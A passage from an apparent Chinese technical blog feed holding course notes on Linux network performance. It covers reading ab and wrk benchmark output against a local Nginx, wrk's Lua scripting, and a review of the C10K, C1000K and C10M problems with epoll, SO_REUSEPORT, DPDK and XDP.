class="hljs-number">1078.54</span> [<span class="hljs-comment">#/sec] (mean)</span><br><span class="hljs-attr">Time per request:</span>       <span class="hljs-number">927.183</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean)</span><br><span class="hljs-attr">Time per request:</span>       <span class="hljs-number">0.927</span> [<span class="hljs-string">ms</span>] <span class="hljs-string">(mean</span>, <span class="hljs-string">across</span> <span class="hljs-string">all</span> <span class="hljs-string">concurrent</span> <span class="hljs-string">requests)</span><br><span class="hljs-attr">Transfer rate:</span>          <span class="hljs-number">890.00</span> [<span class="hljs-string">Kbytes/sec</span>] <span class="hljs-string">received</span><br><br><span class="hljs-string">Connection</span> <span class="hljs-string">Times</span> <span class="hljs-string">(ms)</span><br>              <span class="hljs-string">min</span>  <span class="hljs-string">mean</span>[<span class="hljs-string">+/-sd</span>] <span class="hljs-string">median</span>   <span class="hljs-string">max</span><br><span class="hljs-attr">Connect:</span>        <span class="hljs-number">0</span>   <span class="hljs-number">27</span> <span class="hljs-number">152.1</span>      <span class="hljs-number">1</span>    <span class="hljs-number">1038</span><br><span class="hljs-attr">Processing:</span>     <span class="hljs-number">9</span>  <span class="hljs-number">207</span> <span class="hljs-number">843.0</span>     <span class="hljs-number">22</span>    <span class="hljs-number">9242</span><br><span class="hljs-attr">Waiting:</span>        <span class="hljs-number">8</span>  <span class="hljs-number">207</span> <span class="hljs-number">843.0</span>     <span class="hljs-number">22</span>    <span class="hljs-number">9242</span><br><span class="hljs-attr">Total:</span>         <span class="hljs-number">15</span>  <span class="hljs-number">233</span> <span class="hljs-number">857.7</span>     <span class="hljs-number">23</span>    <span class="hljs-number">9268</span><br><br><span class="hljs-string">Percentage</span> <span class="hljs-string">of</span> <span class="hljs-string">the</span> <span class="hljs-string">requests</span> <span class="hljs-string">served</span> <span class="hljs-string">within</span> <span class="hljs-string">a</span> <span class="hljs-string">certain</span> <span class="hljs-string">time</span> <span class="hljs-string">(ms)</span><br>  <span class="hljs-number">50</span><span class="hljs-string">%</span>     <span class="hljs-number">23</span><br>  <span class="hljs-number">66</span><span class="hljs-string">%</span>     <span class="hljs-number">24</span><br>  <span class="hljs-number">75</span><span class="hljs-string">%</span>     <span class="hljs-number">24</span><br>  <span class="hljs-number">80</span><span class="hljs-string">%</span>     <span class="hljs-number">26</span><br>  <span class="hljs-number">90</span><span class="hljs-string">%</span>    <span class="hljs-number">274</span><br>  <span class="hljs-number">95</span><span class="hljs-string">%</span>   <span class="hljs-number">1195</span><br>  <span class="hljs-number">98</span><span class="hljs-string">%</span>   <span class="hljs-number">2335</span><br>  <span class="hljs-number">99</span><span class="hljs-string">%</span>   <span class="hljs-number">4663</span><br> <span class="hljs-number">100</span><span class="hljs-string">%</span>   <span class="hljs-number">9268</span> <span class="hljs-string">(longest</span> <span class="hljs-string">request)</span><br><br></code></pre></td></tr></table></figure><p>可以看到，ab 的测试结果分为三个部分，分别是请求汇总、连接时间汇总还有请求延迟汇总。以上面的结果为例，我们具体来看。</p><p>在请求汇总部分，可以看到：</p><ul><li><p>Requests per second 为 1074；</p></li><li><p>每个请求的延迟（Time per request）分为两行，第一行的 927 ms 表示平均延迟，包括了线程运行的调度时间和网络请求响应时间，而下一行的 0.927ms ，则表示实际请求的响应时间；</p></li><li><p>Transfer rate 表示吞吐量（BPS）为 890 KB&#x2F;s。</p></li></ul><p>连接时间汇总部分，则是分别展示了建立连接、请求、等待以及汇总等的各类时间，包括最小、最大、平均以及中值处理时间。</p><p>最后的请求延迟汇总部分，则给出了不同时间段内处理请求的百分比，比如， 90% 的请求，都可以在 274ms 内完成。</p><h3 id="应用负载性能"><a href="#应用负载性能" class="headerlink" title="应用负载性能"></a>应用负载性能</h3><p>当用 iperf 或者 ab 等测试工具，得到 TCP、HTTP 等的性能数据后，这些数据是否就能表示应用程序的实际性能呢？</p><p>答案应该是否定的。比如，你的应用程序基于 HTTP 协议，为最终用户提供一个 Web 服务。这时，使用 ab 工具，可以得到某个页面的访问性能，但这个结果跟用户的实际请求，很可能不一致。因为用户请求往往会附带着各种各种的负载（payload），而这些负载会影响 Web 应用程序内部的处理逻辑，从而影响最终性能。</p><p>那么，为了得到应用程序的实际性能，就要求性能工具本身可以模拟用户的请求负载，而iperf、ab 这类工具就无能为力了。幸运的是，我们还可以用 wrk、TCPCopy、Jmeter 或者 LoadRunner 等实现这个目标。</p><p>以 <a href="https://github.com/wg/wrk">wrk</a> 为例，它是一个 HTTP 性能测试工具，内置了 LuaJIT，方便你根据实际需求，生成所需的请求负载，或者自定义响应的处理方法。</p><p>wrk 工具本身不提供 yum 或 apt 的安装方法，需要通过源码编译来安装。比如，可以运行下面的命令，来编译和安装 wrk：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">https://github.com/wg/wrk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> wrk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install build-essential -y</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> wrk /usr/local/bin/</span><br><br></code></pre></td></tr></table></figure><p>wrk 的命令行参数比较简单。比如，我们可以用 wrk ，来重新测一下前面已经启动的 Nginx 的性能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -c表示并发连接数1000，-t表示线程数为2</span><br>$ wrk -c 1000 -t 2 http://192.168.0.30/<br>Running 10s <span class="hljs-built_in">test</span> @ http://192.168.0.30/<br>  2 threads and 1000 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency    65.83ms  174.06ms   1.99s    95.85%<br>    Req/Sec     4.87k   628.73     6.78k    69.00%<br>  96954 requests <span class="hljs-keyword">in</span> 10.06s, 78.59MB <span class="hljs-built_in">read</span><br>  Socket errors: connect 0, <span class="hljs-built_in">read</span> 0, write 0, <span class="hljs-built_in">timeout</span> 179<br>Requests/sec:   9641.31<br>Transfer/sec:      7.82MB<br><br></code></pre></td></tr></table></figure><p>这里使用 2 个线程、并发 1000 连接，重新测试了 Nginx 的性能。你可以看到，每秒请求数为 9641，吞吐量为 7.82MB，平均延迟为 65ms，比前面 ab 的测试结果要好很多。</p><p>这也说明，性能工具本身的性能，对性能测试也是至关重要的。不合适的性能工具，并不能准确测出应用程序的最佳性能。</p><p>当然，wrk 最大的优势，是其内置的 LuaJIT，可以用来实现复杂场景的性能测试。wrk 在调用 Lua 脚本时，可以将 HTTP 请求分为三个阶段，即 setup、running、done，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/d0/82/d02b845aa308b7a38a5735f3db8d9682.png?wh=621*530" alt="img"></p><p>（图片来自 <a href="https://sq.163yun.com/blog/article/200008406328934400">网易云博客</a>）</p><p>比如，你可以在 setup 阶段，为请求设置认证参数（来自于 wrk 官方 <a href="https://github.com/wg/wrk/blob/master/scripts/auth.lua">示例</a>）：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">-- example script that demonstrates response handling and</span><br><span class="hljs-comment">-- retrieving an authentication token to set on all future</span><br><span class="hljs-comment">-- requests</span><br><br>token = <span class="hljs-literal">nil</span><br><span class="hljs-built_in">path</span>  = <span class="hljs-string">&quot;/authenticate&quot;</span><br><br>request = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><br>   <span class="hljs-keyword">return</span> wrk.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-built_in">path</span>)<br><span class="hljs-keyword">end</span><br><br>response = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(status, headers, body)</span></span><br>   <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token <span class="hljs-keyword">and</span> <span class="hljs-built_in">status</span> == <span class="hljs-number">200</span> <span class="hljs-keyword">then</span><br>      token = headers[<span class="hljs-string">&quot;X-Token&quot;</span>]<br>      <span class="hljs-built_in">path</span>  = <span class="hljs-string">&quot;/resource&quot;</span><br>      wrk.headers[<span class="hljs-string">&quot;X-Token&quot;</span>] = token<br>   <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure><p>而在执行测试时，通过 -s 选项，执行脚本的路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ wrk -c <span class="hljs-number">1000</span> -t <span class="hljs-number">2</span> -s auth.lua http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.30</span>/<br><br></code></pre></td></tr></table></figure><p>wrk 需要你用 Lua 脚本，来构造请求负载。这对于大部分场景来说，可能已经足够了 。不过，它的缺点也正是，所有东西都需要代码来构造，并且工具本身不提供 GUI 环境。</p><p>像 Jmeter 或者 LoadRunner（商业产品），则针对复杂场景提供了脚本录制、回放、GUI 等更丰富的功能，使用起来也更加方便。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>性能评估是优化网络性能的前提，只有在你发现网络性能瓶颈时，才需要进行网络性能优化。根据 TCP&#x2F;IP 协议栈的原理，不同协议层关注的性能重点不完全一样，也就对应不同的性能测试方法。比如，</p><ul><li><p>在应用层，你可以使用 wrk、Jmeter 等模拟用户的负载，测试应用程序的每秒请求数、处理延迟、错误数等；</p></li><li><p>而在传输层，则可以使用 iperf 等工具，测试 TCP 的吞吐情况；</p></li><li><p>再向下，你还可以用 Linux 内核自带的 pktgen ，测试服务器的 PPS。</p></li></ul><p>由于低层协议是高层协议的基础。所以，一般情况下，我们需要从上到下，对每个协议层进行性能测试，然后根据性能测试的结果，结合 Linux 网络协议栈的原理，找出导致性能瓶颈的根源，进而优化网络性能。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3.C10K 和 C1000K 回顾</title>
    <link href="/2022/11/06/3.C10K%20%E5%92%8C%20C1000K%20%E5%9B%9E%E9%A1%BE/"/>
    <url>/2022/11/06/3.C10K%20%E5%92%8C%20C1000K%20%E5%9B%9E%E9%A1%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="3-C10K-和-C1000K-回顾"><a href="#3-C10K-和-C1000K-回顾" class="headerlink" title="3.C10K 和 C1000K 回顾"></a>3.C10K 和 C1000K 回顾</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>前面内容，学习了 Linux 网络的基础原理以及性能观测方法。Linux 网络基于 TCP&#x2F;IP 模型，构建了其网络协议栈，把繁杂的网络功能划分为应用层、传输层、网络层、网络接口层四个不同的层次，既解决了网络环境中设备异构的问题，也解耦了网络协议的复杂性。</p><p>基于 TCP&#x2F;IP 模型，我们还梳理了 Linux 网络收发流程和相应的性能指标。在应用程序通过套接字接口发送或者接收网络包时，这些网络包都要经过协议栈的逐层处理。我们通常用带宽、吞吐、延迟、PPS 等来衡量网络性能。</p><p>主要来回顾下经典的 C10K 和 C1000K 问题，以更好理解 Linux 网络的工作原理，并进一步分析，如何做到单机支持 C10M。</p><blockquote><p>注意，C10K 和 C1000K 的首字母 C 是 Client 的缩写。C10K 就是单机同时处理 1 万个请求（并发连接1万）的问题，而 C1000K 也就是单机支持处理 100 万个请求（并发连接100万）的问题。</p></blockquote><h2 id="C10K"><a href="#C10K" class="headerlink" title="C10K"></a>C10K</h2><p><a href="http://www.kegel.com/c10k.html">C10K 问题</a> 最早由 Dan Kegel 在 1999年提出。那时的服务器还只是 32 位系统，运行着 Linux 2.2 版本（后来又升级到了 2.4 和 2.6，而 2.6 才支持 x86_64），只配置了很少的内存（2GB）和千兆网卡。</p><p>怎么在这样的系统中支持并发 1 万的请求呢？</p><p>从资源上来说，对2GB 内存和千兆网卡的服务器来说，同时处理 10000 个请求，只要每个请求处理占用不到 200KB（2GB&#x2F;10000）的内存和 100Kbit （1000Mbit&#x2F;10000）的网络带宽就可以。所以，物理资源是足够的，接下来自然是软件的问题，特别是网络的 I&#x2F;O 模型问题。</p><p>在 C10K 以前，Linux 中网络处理都用同步阻塞的方式，也就是每个请求都分配一个进程或者线程。请求数只有 100 个时，这种方式自然没问题，但增加到 10000 个请求时，10000 个进程或线程的调度、上下文切换乃至它们占用的内存，都会成为瓶颈。</p><p>既然每个请求分配一个线程的方式不合适，那么，为了支持 10000 个并发请求，这里就有两个问题需要我们解决。</p><p>第一，怎样在一个线程内处理多个请求，也就是要在一个线程内响应多个网络 I&#x2F;O。以前的同步阻塞方式下，一个线程只能处理一个请求，到这里不再适用，是不是可以用非阻塞 I&#x2F;O 或者异步 I&#x2F;O 来处理多个网络请求呢？</p><p>第二，怎么更节省资源地处理客户请求，也就是要用更少的线程来服务这些请求。是不是可以继续用原来的 100 个或者更少的线程，来服务现在的 10000 个请求呢？</p><h3 id="I-x2F-O-模型优化"><a href="#I-x2F-O-模型优化" class="headerlink" title="I&#x2F;O 模型优化"></a>I&#x2F;O 模型优化</h3><p>异步、非阻塞 I&#x2F;O 的解决思路，你应该听说过，其实就是我们在网络编程中经常用到的 I&#x2F;O 多路复用（I&#x2F;O Multiplexing）。I&#x2F;O 多路复用是什么意思呢？</p><p>别急，详细了解前，我先来讲两种 I&#x2F;O 事件通知的方式：水平触发和边缘触发，它们常用在套接字接口的文件描述符中。</p><ul><li><p>水平触发（ LT）：只要文件描述符可以非阻塞地执行 I&#x2F;O ，就会触发通知。也就是说，应用程序可以随时检查文件描述符的状态，然后再根据状态，进行 I&#x2F;O 操作。</p></li><li><p>边缘触发（ET）：只有在文件描述符的状态发生改变（也就是 I&#x2F;O 请求达到）时，<strong>才发送一次通知</strong>。这时候，应用程序需要尽可能多地执行 I&#x2F;O，直到无法继续读写，才可以停止。如果 I&#x2F;O 没执行完，或者因为某种原因没来得及处理，那么这次通知也就丢失了。</p></li></ul><p>应用场景：select&#x2F;poll是LT模式，epoll默认使用的也是水平触发模式（LT）。 目前业界对于ET的最佳实践大概就是Nginx了，单线程redis也是使用的LT </p><p> LT:文件描述符准备就绪时（FD关联的读缓冲区不为空，可读。写缓冲区还没满，可写），触发通知。 </p><p> ET:当FD关联的缓冲区发生变化时（例如：读缓冲区由空变为非空，有新数据达到，可读。写缓冲区满变有空间了，有数据被发送走，可写），触发通知，<strong>仅此一次</strong></p><p>接下来，再回过头来看 I&#x2F;O 多路复用的方法。</p><p><strong>第一种，使用非阻塞 I&#x2F;O 和水平触发通知，比如使用 select 或者 poll。</strong></p><p>根据刚才水平触发的原理，select 和 poll 需要从文件描述符列表中，找出哪些可以执行 I&#x2F;O ，然后进行真正的网络 I&#x2F;O 读写。由于 I&#x2F;O 是非阻塞的，一个线程中就可以同时监控一批套接字的文件描述符，这样就达到了单线程处理多请求的目的。</p><p>所以，这种方式的最大优点，是对应用程序比较友好，它的 API 非常简单。</p><p>但是，应用软件使用 select 和 poll 时，需要对这些文件描述符列表进行轮询，这样，请求数多的时候就会比较耗时。并且，select 和 poll 还有一些其他的限制。</p><p>select 使用固定长度的位相量，表示文件描述符的集合，因此会有最大描述符数量的限制。比如，在 32 位系统中，默认限制是 1024。并且，在 select 内部，检查套接字状态是用轮询的方法，处理耗时跟描述符数量是 O(N) 的关系。</p><p>而 poll 改进了 select 的表示方法，换成了一个没有固定长度的数组，这样就没有了最大描述符数量的限制（当然还会受到系统文件描述符限制）。但应用程序在使用 poll 时，同样需要对文件描述符列表进行轮询，这样，处理耗时跟描述符数量就是 O(N) 的关系。</p><p>除此之外，应用程序每次调用 select 和 poll 时，还需要把文件描述符的集合，从用户空间传入内核空间，由内核修改后，再传出到用户空间中。这一来一回的内核空间与用户空间切换，也增加了处理成本。</p><p>有没有什么更好的方式来处理呢？答案自然是肯定的。</p><p><strong>第二种，使用非阻塞 I&#x2F;O 和边缘触发通知，比如 epoll</strong>。</p><p>既然 select 和 poll 有那么多的问题，就需要继续对其进行优化，而 epoll 就很好地解决了这些问题。</p><ul><li><p>epoll 使用红黑树，在内核中管理文件描述符的集合，这样，就不需要应用程序在每次操作时都传入、传出这个集合。</p></li><li><p>epoll 使用事件驱动的机制，只关注有 I&#x2F;O 事件发生的文件描述符，不需要轮询扫描整个集合。</p></li></ul><p>不过要注意，epoll 是在 Linux 2.6 中才新增的功能（2.4 虽然也有，但功能不完善）。由于边缘触发只在文件描述符可读或可写事件发生时才通知，那么应用程序就需要尽可能多地执行 I&#x2F;O，并要处理更多的异常事件。</p><p><strong>第三种，使用异步 I&#x2F;O（Asynchronous I&#x2F;O，简称为 AIO）</strong>。在前面文件系统原理的内容中，我曾介绍过异步I&#x2F;O 与同步 I&#x2F;O 的区别。异步I&#x2F;O 允许应用程序同时发起很多 I&#x2F;O 操作，而不用等待这些操作完成。而在 I&#x2F;O完成后，系统会用事件通知（比如信号或者回调函数）的方式，告诉应用程序。这时，应用程序才会去查询 I&#x2F;O 操作的结果。</p><p>异步 I&#x2F;O 也是到了 Linux 2.6 才支持的功能，并且在很长时间里都处于不完善的状态，比如 glibc 提供的异步 I&#x2F;O 库，就一直被社区诟病。同时，由于异步 I&#x2F;O 跟我们的直观逻辑不太一样，想要使用的话，一定要小心设计，其使用难度比较高。</p><h3 id="工作模型优化"><a href="#工作模型优化" class="headerlink" title="工作模型优化"></a>工作模型优化</h3><p>了解了 I&#x2F;O 模型后，请求处理的优化就比较直观了。使用 I&#x2F;O 多路复用后，就可以在一个进程或线程中处理多个请求，其中，又有下面两种不同的工作模型。</p><p><strong>第一种，主进程+多个 worker 子进程，这也是最常用的一种模型</strong>。这种方法的一个通用工作模式就是：</p><ul><li><p>主进程执行 bind() + listen() 后，创建多个子进程；</p></li><li><p>然后，在每个子进程中，都通过 accept() 或 epoll_wait() ，来处理相同的套接字。</p></li></ul><p>比如，最常用的反向代理服务器 Nginx 就是这么工作的。它也是由主进程和多个 worker 进程组成。主进程主要用来初始化套接字，并管理子进程的生命周期；而 worker 进程，则负责实际的请求处理。关系如下。</p><p><img src="https://static001.geekbang.org/resource/image/45/7e/451a24fb8f096729ed6822b1615b097e.png?wh=436*462" alt="img"></p><p>这里要注意，accept() 和 epoll_wait() 调用，还存在一个惊群的问题。换句话说，当网络 I&#x2F;O 事件发生时，多个进程被同时唤醒，但实际上只有一个进程来响应这个事件，其他被唤醒的进程都会重新休眠。</p><ul><li><p>其中，accept() 的惊群问题，已经在 Linux 2.6 中解决了；</p></li><li><p>而 epoll 的问题，到了 Linux 4.5 ，才通过 EPOLLEXCLUSIVE 解决。</p></li></ul><p>为了避免惊群问题， Nginx 在每个 worker 进程中，都增加一个了全局锁（accept_mutex）。这些 worker 进程需要首先竞争到锁，只有竞争到锁的进程，才会加入到 epoll 中，这样就确保只有一个 worker 子进程被唤醒。</p><p>进程的管理、调度、上下文切换的成本非常高。那为什么使用多进程模式的 Nginx ，却具有非常好的性能呢？</p><p>这里最主要的一个原因就是，这些 worker 进程，实际上并不需要经常创建和销毁，而是在没任务时休眠，有任务时唤醒。只有在 worker 由于某些异常退出时，主进程才需要创建新的进程来代替它。</p><p>当然，也可以用线程代替进程：主线程负责套接字初始化和子线程状态的管理，而子线程则负责实际的请求处理。由于线程的调度和切换成本比较低，实际上可以进一步把 epoll_wait() 都放到主线程中，保证每次事件都只唤醒主线程，而子线程只需要负责后续的请求处理。</p><p><strong>第二种，监听到相同端口的多进程模型</strong>。在这种方式下，所有的进程都监听相同的接口，并且开启 SO_REUSEPORT 选项，由内核负责将请求负载均衡到这些监听进程中去。这一过程如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/90/bd/90df0945f6ce5c910ae361bf2b135bbd.png?wh=436*462" alt="img"></p><p>由于内核确保了只有一个进程被唤醒，就不会出现惊群问题了。比如，Nginx 在 1.9.1 中就已经支持了这种模式。</p><p><img src="https://static001.geekbang.org/resource/image/af/38/af2e6c3a19a6e90098772b5df0605b38.png?wh=850*780" alt="img"></p><p>（图片来自 <a href="https://www.nginx.com/blog/socket-sharding-nginx-release-1-9-1/">Nginx 官网博客</a>）</p><p>要注意想要使用SO_REUSEPORT选项，需要用 Linux 3.9 以上的版本才可以。</p><h2 id="C1000K"><a href="#C1000K" class="headerlink" title="C1000K"></a>C1000K</h2><p>基于 I&#x2F;O 多路复用和请求处理的优化，C10K 问题很容易就可以解决。不过，随着摩尔定律带来的服务器性能提升，以及互联网的普及，新兴服务会对性能提出更高的要求。</p><p>很快，原来的 C10K 已经不能满足需求，所以又有了 C100K 和 C1000K，也就是并发从原来的 1 万增加到10 万、乃至 100 万。从 1 万到 10 万，其实还是基于 C10K 的这些理论，epoll 配合线程池，再加上 CPU、内存和网络接口的性能和容量提升。大部分情况下，C100K 很自然就可以达到。</p><p>那么，再进一步，C1000K 是不是也可以很容易就实现呢？这其实没有那么简单了。</p><p>首先从物理资源使用上来说，100 万个请求需要大量的系统资源。比如，</p><ul><li><p>假设每个请求需要 16KB 内存的话，那么总共就需要大约 15 GB 内存。</p></li><li><p>而从带宽上来说，假设只有 20% 活跃连接，即使每个连接只需要 1KB&#x2F;s 的吞吐量，总共也需要 1.6 Gb&#x2F;s 的吞吐量。千兆网卡显然满足不了这么大的吞吐量，所以还需要配置万兆网卡，或者基于多网卡 Bonding 承载更大的吞吐量。</p></li></ul><p>其次，从软件资源上来说，大量的连接也会占用大量的软件资源，比如文件描述符的数量、连接状态的跟踪（CONNTRACK）、网络协议栈的缓存大小（比如套接字读写缓存、TCP 读写缓存）等等。</p><p>最后，大量请求带来的中断处理，也会带来非常高的处理成本。这样，就需要多队列网卡、中断负载均衡、CPU 绑定、RPS&#x2F;RFS（软中断负载均衡到多个 CPU 核上），以及将网络包的处理卸载（Offload）到网络设备（如 TSO&#x2F;GSO、LRO&#x2F;GRO、VXLAN OFFLOAD）等各种硬件和软件的优化。</p><p>C1000K 的解决方法，本质上还是构建在 <strong>epoll 的非阻塞 I&#x2F;O 模型上</strong>。只不过，除了 I&#x2F;O 模型之外，还需要从应用程序到 Linux 内核、再到 CPU、内存和网络等各个层次的深度优化，特别是需要借助硬件，来卸载那些原来通过软件处理的大量功能。</p><h2 id="C10M"><a href="#C10M" class="headerlink" title="C10M"></a>C10M</h2><p>显然，人们对于性能的要求是无止境的。再进一步，有没有可能在单机中，同时处理 1000 万的请求呢？这也就是 <a href="http://c10m.robertgraham.com/p/blog-page.html">C10M</a> 问题。</p><p>实际上，在 C1000K 问题中，各种软件、硬件的优化很可能都已经做到头了。特别是当升级完硬件（比如足够多的内存、带宽足够大的网卡、更多的网络功能卸载等）后，可能会发现，无论怎么优化应用程序和内核中的各种网络参数，想实现 1000 万请求的并发，都是极其困难的。</p><p>究其根本，还是 <strong>Linux 内核协议栈做了太多太繁重的工作</strong>。<strong>从网卡中断带来的硬中断处理程序开始，到软中断中的各层网络协议处理，最后再到应用程序，这个路径实在是太长了，就会导致网络包的处理优化，到了一定程度后，就无法更进一步了</strong>。</p><p>要解决这个问题，最重要就是跳过内核协议栈的冗长路径，把网络包直接送到要处理的应用程序那里去。这里有两种常见的机制，**<a href="https://cloud.tencent.com/developer/article/1484793">DPDK 和 XDP</a>**。</p><p>第一种机制，DPDK，是用户态网络的标准。它跳过内核协议栈，直接由用户态进程通过轮询的方式，来处理网络接收。</p><p><img src="https://static001.geekbang.org/resource/image/99/3a/998fd2f52f0a48a910517ada9f2bb23a.png?wh=1600*1532" alt="img"></p><p>（图片来自 <a href="https://blog.selectel.com/introduction-dpdk-architecture-principles/">https://blog.selectel.com/introduction-dpdk-architecture-principles/</a>）</p><p>说起轮询，你肯定会下意识认为它是低效的象征，但是进一步反问下自己，它的低效主要体现在哪里呢？是查询时间明显多于实际工作时间的情况下吧！那么，换个角度来想，如果每时每刻都有新的网络包需要处理，轮询的优势就很明显了。比如：</p><ul><li><p>在 PPS 非常高的场景中，查询时间比实际工作时间少了很多，绝大部分时间都在处理网络包；</p></li><li><p>而跳过内核协议栈后，就省去了繁杂的硬中断、软中断再到 Linux 网络协议栈逐层处理的过程，应用程序可以针对应用的实际场景，有针对性地优化网络包的处理逻辑，而不需要关注所有的细节。</p></li></ul><p>此外，DPDK 还通过大页、CPU 绑定、内存对齐、流水线并发等多种机制，优化网络包的处理效率。前提需要能支持 DPDK 的网卡配合使用。</p><p>第二种机制，XDP（eXpress Data Path），则是 Linux 内核提供的一种高性能网络数据路径。它允许网络包，在进入内核协议栈之前，就进行处理，也可以带来更高的性能。XDP 底层跟我们之前用到的 bcc-tools 一样，都是基于 Linux 内核的 eBPF 机制实现的。</p><p>XDP 的原理如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/06/be/067ef9df4212cd4ede3cffcdac7001be.png?wh=1024*560" alt="img"></p><p>（图片来自 <a href="https://www.iovisor.org/technology/xdp">https://www.iovisor.org/technology/xdp</a>）</p><p>XDP 对内核的要求比较高，需要的是 Linux <a href="https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md#xdp">4.8 以上版本</a>，并且它也不提供缓存队列。基于 XDP 的应用程序通常是专用的网络应用，常见的有 IDS（入侵检测系统）、DDoS 防御、 <a href="https://github.com/cilium/cilium">cilium</a> 容器网络插件等。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章回顾了经典的 C10K 问题，并进一步延伸到了C1000K 和 C10M 问题。</p><p>C10K 问题的根源，一方面在于系统有限的资源；另一方面，也是更重要的因素，是同步阻塞的 I&#x2F;O 模型以及轮询的套接字接口，限制了网络事件的处理效率。Linux 2.6 中引入的 epoll ，完美解决了 C10K 的问题，现在的高性能网络方案都基于 epoll。</p><p>从 C10K 到 C100K ，可能只需要增加系统的物理资源就可以满足；但从 C100K 到 C1000K ，就不仅仅是增加物理资源就能解决的问题了。这时，就需要多方面的优化工作了，从硬件的中断处理和网络功能卸载、到网络协议栈的文件描述符数量、连接状态跟踪、缓存队列等内核的优化，再到应用程序的工作模型优化，都是考虑的重点。</p><p>再进一步，要实现 C10M ，就不只是增加物理资源，或者优化内核和应用程序可以解决的问题了。这时候，就需要用 XDP 的方式，在内核协议栈之前处理网络包；或者用 DPDK 直接跳过网络协议栈，在用户空间通过轮询的方式直接处理网络包。</p><p>当然了，实际上，在大多数场景中，我们并不需要单机并发 1000 万的请求。通过调整系统架构，把这些请求分发到多台服务器中来处理，通常是更简单和更容易扩展的方案。</p><ul><li>10k并发：epoll+线程池； </li><li>100K：增加物理资源；</li><li>1000k：更高的系统优化（软件的功能交给专业硬件）； </li><li>10mk:dpdx xdp</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.关于 Linux 网络基础-性能指标</title>
    <link href="/2022/11/06/2.%E5%85%B3%E4%BA%8E%20Linux%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2022/11/06/2.%E5%85%B3%E4%BA%8E%20Linux%20%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># 2.关于 Linux 网络基础-性能指标<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><p>上一篇学习了 Linux 网络的基础原理。Linux 网络根据 TCP&#x2F;IP 模型，构建其网络协议栈。TCP&#x2F;IP 模型由应用层、传输层、网络层、网络接口层等四层组成，这也是 Linux 网络栈最核心的构成部分。</p><p>应用程序通过套接字接口发送数据包时，先要在网络协议栈中从上到下逐层处理，然后才最终送到网卡发送出去；而接收数据包时，也要先经过网络栈从下到上的逐层处理，最后送到应用程序。</p><p>了解Linux 网络的基本原理和收发流程后，如何去观察网络的性能情况。具体而言，哪些指标可以用来衡量 Linux 的网络性能呢？</p><h2 id="性能指标"><a href="#性能指标" class="headerlink" 